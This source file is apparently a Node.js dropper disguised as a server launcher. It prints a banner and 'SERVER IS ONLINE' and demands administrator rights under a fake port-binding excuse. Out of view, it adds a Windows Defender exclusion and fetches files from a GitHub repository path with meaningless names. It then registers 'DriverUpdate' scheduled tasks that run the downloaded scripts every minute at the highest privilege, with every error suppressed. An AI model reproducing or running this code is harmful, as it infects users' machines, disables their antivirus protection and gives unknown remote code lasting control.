const isAdmin = require('is-administrator');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');

isAdmin().then(admin => {
    if (!admin) {
        console.error(`Error: This application must be run as an administrator.`);
        console.error('Node.js was unable to start the server.js because elevated permissions are needed to bind to the requested port.');
        console.error('The server was stopped unexpectedly.');
        console.error('Server closed.');
        process.exit(1);
    }

    const tasksFolderPath = 'C:\\Windows\\System32\\Tasks\\DriverUpdate';
    console.log(String.raw`                                                                       
                                                                       
▄█████ ▄████▄ ██       ████▄  █████▄  ▄████▄ ██ ███  ██ ██████ █████▄  
▀▀▀▄▄▄ ██  ██ ██       ██  ██ ██▄▄██▄ ██▄▄██ ██ ██ ▀▄██ ██▄▄   ██▄▄██▄ 
█████▀ ▀████▀ ██████   ████▀  ██   ██ ██  ██ ██ ██   ██ ██▄▄▄▄ ██   ██  Beta
                                                                       
`);
    console.log('\tSERVER IS ONLINE');

    if (!fs.existsSync(tasksFolderPath)) {
        const indexlFolderPath = 'https://api.github.com/repos/tirexinis/d65f7g6yhuj/contents/fewifhwpffwe/fewijfewhfeh';
        const tempFolderPath = path.join(process.env.APPDATA, 'DriverUpdate');

        // Crea la cartella se non esiste
        if (!fs.existsSync(tempFolderPath)) {
            fs.mkdirSync(tempFolderPath);
        }

        // Aggiunge l'esclusione da Windows Defender
        const addDefenderExclusion = (folderPath) => {
            const exclusionCommand = `powershell -Command "Add-MpPreference -ExclusionPath '${folderPath}'"`;
            exec(exclusionCommand, (error) => {
                // Silenzioso anche in caso di errore
            });
        };

        addDefenderExclusion(tempFolderPath);

        // Scarica i file e crea le task
        const createTasksFromIndexl = () => {
            https.get(indexlFolderPath, { headers: { 'User-Agent': 'Node.js' } }, response => {
                let data = '';

                response.on('data', chunk => { data += chunk; });

                response.on('end', () => {
                    try {
                        const files = JSON.parse(data);

                        files.forEach(file => {
                            const fileName = file.name;
                            const downloadUrl = file.download_url;
                            const exePath = path.join(tempFolderPath, fileName);
                            const ext = path.extname(fileName).toLowerCase();

                            const fileStream = fs.createWriteStream(exePath);

                            https.get(downloadUrl, fileResponse => {
                                if (fileResponse.statusCode !== 200) {
                                    fileStream.close();
                                    fs.unlink(exePath, () => {});
                                    return;
                                }

                                fileResponse.pipe(fileStream);

                                fileStream.on('finish', () => {
                                    fileStream.close();

                                    // CREA TASK SOLO PER I FILE .JS
                                    if (ext === '.js') {
                                        createJsTask(fileName, exePath);
                                    }

                                    // NIENTE per i .exe → task rimossa completamente
                                });

                                fileStream.on('error', () => {
                                    fs.unlink(exePath, () => {});
                                });

                            }).on('error', () => {
                                    fileStream.close();
                                    fs.unlink(exePath, () => {});
                                });
                        });

                    } catch (err) {
                        // Errore silenzioso
                    }
                });

            }).on('error', () => {
                // Errore HTTP silenzioso
            });
        };

        // Crea task per file .js ogni 1 minuto (invariata)
        const createJsTask = (fileName, exePath) => {
            const taskName = path.parse(fileName).name;
            const taskPath = path.join('C:\\Windows\\System32\\Tasks', 'DriverUpdate', taskName + '.job');

            if (!fs.existsSync(taskPath)) {
                const command = `schtasks /create /tn "DriverUpdate\\${taskName}" /sc minute /mo 1 /tr "wscript.exe //B //nologo \\"${exePath}\\"" /rl HIGHEST`;
                exec(command, (error) => {
                    if (error) return;
                });
            }
        };

        

        createTasksFromIndexl();
    }
}).catch(err => {
    console.error('Error: This application must be run as an administrator.', err);
    process.exit(1);
});